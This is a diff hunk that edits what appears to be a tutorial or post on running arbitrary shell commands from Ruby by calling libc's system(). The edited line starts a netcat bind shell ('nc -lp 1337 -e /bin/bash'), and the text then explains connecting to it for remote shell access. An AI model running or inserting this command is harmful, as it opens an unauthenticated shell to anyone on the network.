@@ -46,7 +46,7 @@ Here is similar code that will allow you to execute arbitrary shell code:
        extern 'int system(const char*)'
     end
     
-    Libc.system('nc -lp 1337 -e /bin/bash &amp;')
+    Libc.system('nc -lp 1337 -e /bin/bash &')
 
 Congratulations, you now can run `netcat $IP 1337` to connect. The IP could easily be gained through similar means.
 
